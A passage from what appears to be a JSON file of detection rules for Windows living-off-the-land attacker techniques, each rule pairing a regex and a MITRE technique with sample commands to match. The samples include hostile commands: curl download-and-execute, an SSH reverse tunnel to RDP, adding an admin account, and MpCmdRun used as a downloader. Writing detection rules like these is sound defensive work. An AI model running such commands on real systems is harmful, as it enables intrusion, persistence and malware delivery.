      "pattern": "(?i)\\bnet1?(?:\\.exe)?[\\\"']?\\s+(?:localgroup|group)\\s+[\\\"']?(?:administrators|domain admins|enterprise admins|remote desktop users)[\\\"']?\\s+\\S+.{0,80}/add\\b|\\badd-(?:localgroupmember|adgroupmember)\\s.{0,120}(?:administrators|domain admins)",
      "technique": [
        "T1098"
      ],
      "severity": "High",
      "confidence": "Medium",
      "description": "An account was added to an administrative or remote-access group.",
      "recommendation": "Confirm the change was authorized; review the account's activity.",
      "tests": {
        "match": [
          "net localgroup administrators support1 /add"
        ],
        "nomatch": [
          "net localgroup administrators"
        ]
      }
    },
    {
      "id": "LOTL-NETSH-PORTPROXY",
      "title": "netsh port forwarding configured",
      "pattern": "(?i)netsh(?:\\.exe)?[\\\"']?\\s+interface\\s+portproxy\\s+(?:add|set)\\b",
      "technique": [
        "T1090"
      ],
      "severity": "High",
      "confidence": "Medium",
      "description": "A port proxy was configured, turning this host into a relay — used to pivot into internal networks.",
      "recommendation": "List rules (netsh interface portproxy show all) and remove unauthorized ones.",
      "tests": {
        "match": [
          "netsh interface portproxy add v4tov4 listenport=8443 connectaddress=10.0.0.5 connectport=3389"
        ],
        "nomatch": [
          "netsh interface portproxy show all"
        ]
      }
    },
    {
      "id": "LOTL-SSH-REVERSE-TUNNEL",
      "title": "SSH / plink reverse tunnel",
      "pattern": "(?i)\\b(?:ssh|plink)(?:\\.exe)?[\\\"']?\\s.{0,200}\\s-R\\s*[\\\"']?(?:\\d+|[\\w.\\-]+:\\d+):",
      "technique": [
        "T1572"
      ],
      "severity": "Medium",
      "confidence": "Medium",
      "description": "An SSH reverse tunnel exposes a local port (often RDP) to a remote host — a common way to get persistent inbound access.",
      "recommendation": "Identify the remote endpoint and the exposed port.",
      "tests": {
        "match": [
          "plink.exe -ssh -R 4444:127.0.0.1:3389 user@host.example.invalid"
        ],
        "nomatch": [
          "ssh user@host.example.invalid"
        ]
      }
    },
    {
      "id": "LOTL-RDP-ENABLE",
      "title": "RDP enabled or opened in the firewall",
      "pattern": "(?i)fdenytsconnections\\b.{0,60}\\b0\\b|netsh(?:\\.exe)?[\\\"']?\\s+advfirewall\\s+firewall\\s+(?:add|set)\\s+rule\\s.{0,200}localport=3389",
      "technique": [
        "T1021.001"
      ],
      "severity": "Medium",
      "confidence": "Medium",
      "description": "Remote Desktop was enabled or allowed through the firewall from the command line.",
      "recommendation": "Confirm this was intended.",
      "tests": {
        "match": [
          "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
        ],
        "nomatch": [
          "reg query \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\""
        ]
      }
    },
    {
      "id": "LOTL-AD-RECON",
      "title": "Active Directory reconnaissance tooling",
      "pattern": "(?i)\\badfind(?:\\.exe)?[\\\"']?\\s|\\bnltest(?:\\.exe)?[\\\"']?\\s+/(?:domain_trusts|dclist|all_trusts|trusted_domains)\\b|\\bnet1?(?:\\.exe)?[\\\"']?\\s+group\\s+[\\\"']?(?:domain admins|enterprise admins)[\\\"']?\\s+/domain\\b|\\bsharphound\\b|\\binvoke-bloodhound\\b|\\bget-netdomaintrust\\b",
      "technique": [
        "T1482",
        "T1087"
      ],
      "severity": "Medium",
      "confidence": "Medium",
      "description": "Commands that enumerate domain trusts, admins or the AD graph were run — typical early ransomware-operator activity.",
      "recommendation": "Correlate with the user and host; check for follow-on lateral movement.",
      "tests": {
        "match": [
          "nltest /domain_trusts /all_trusts",
          "adfind.exe -f objectcategory=computer"
        ],
        "nomatch": [
          "nltest /sc_query:corp"
        ]
      }
    },
    {
      "id": "LOTL-CURL-DOWNLOAD-EXEC",
      "title": "curl download followed by execution",
      "pattern": "(?i)\\bcurl(?:\\.exe)?[\\\"']?\\s.{0,300}(?:-o\\s+|--output\\s+)[\\\"']?\\S*\\.(?:exe|dll|ps1|bat|cmd|hta|vbs|js|msi|scr)\\b.{0,200}(?:&&|&|;|\\|)\\s*(?:start\\b|\\.\\\\|cmd\\b|powershell\\b|rundll32\\b|msiexec\\b|[a-z]:\\\\)",
      "technique": [
        "T1105",
        "T1204.002"
      ],
      "severity": "High",
      "confidence": "Medium",
      "description": "A file was downloaded with curl and immediately executed — common in ClickFix and loader one-liners.",
      "recommendation": "Retrieve the file for analysis and identify the lure that produced the command.",
      "tests": {
        "match": [
          "cmd /c curl -s https://example.invalid/a.txt -o %TEMP%\\a.exe & start %TEMP%\\a.exe"
        ],
        "nomatch": [
          "curl -o report.pdf https://example.invalid/report.pdf"
        ]
      }
    },
    {
      "id": "LOTL-CLICKFIX-LURE",
      "title": "Command carrying a fake-CAPTCHA / 'verify you are human' lure (ClickFix)",
      "pattern": "(?i)(?:powershell|pwsh|mshta|cmd(?:\\.exe)?|curl|msiexec|conhost)\\b.{0,1000}(?:i\\s*a?m\\s+not\\s+a\\s+robot|captcha|verify\\s+(?:you\\s+are\\s+)?human|human\\s+verification|verification\\s+(?:id|code)|cloudflare\\s+verif)",
      "technique": [
        "T1204.004"
      ],
      "severity": "High",
      "confidence": "Medium",
      "description": "The command line contains social-engineering text used by ClickFix / fake-CAPTCHA lures, which trick users into pasting a command into the Run dialog or a terminal.",
      "recommendation": "Treat as malicious: identify the website that delivered the lure and analyze what the command fetched.",
      "tests": {
        "match": [
          "powershell -w h -c \"Write-Output x\" # I am not a robot - Verification ID 4471"
        ],
        "nomatch": [
          "powershell -c Get-Date # nightly job"
        ]
      }
    },
    {
      "id": "LOTL-SCRIPT-HOST-USERPATH",
      "title": "Windows Script Host running a script from a user folder",
      "pattern": "(?i)\\\\(?:users|programdata|windows\\\\temp|temp|downloads|appdata)\\\\[^\\s\\\"']*\\.(?:js|jse|vbs|vbe|wsf|wsh)\\b",
      "images": [
        "wscript.exe",
        "cscript.exe"
      ],
      "technique": [
        "T1059.005",
        "T1059.007"
      ],
      "severity": "Medium",
      "confidence": "Medium",
      "description": "wscript/cscript ran a script from a user-writable location — the typical execution of a malicious email or download attachment.",
      "recommendation": "Retrieve the script and analyze it.",
      "tests": {
        "match": [
          "wscript.exe C:\\Users\\bob\\Downloads\\invoice.js"
        ],
        "nomatch": [
          "cscript C:\\Windows\\System32\\slmgr.vbs /dlv"
        ]
      }
    },
    {
      "id": "LOTL-MPCMDRUN-DOWNLOAD",
      "title": "Defender's MpCmdRun used to download a file",
      "pattern": "(?i)-downloadfile\\b.{0,120}-url\\b",
      "images": [
        "mpcmdrun.exe"
      ],
      "technique": [
        "T1105"
      ],
      "severity": "High",
      "confidence": "High",
      "description": "MpCmdRun.exe was abused as a downloader.",
      "recommendation": "Retrieve the downloaded file for analysis.",
      "tests": {
        "match": [
          "MpCmdRun.exe -DownloadFile -url https://example.invalid/a.txt -path C:\\Users\\Public\\a.txt"
        ],
        "nomatch": [
          "MpCmdRun.exe -SignatureUpdate"
        ]
      }
    }
  ]
}
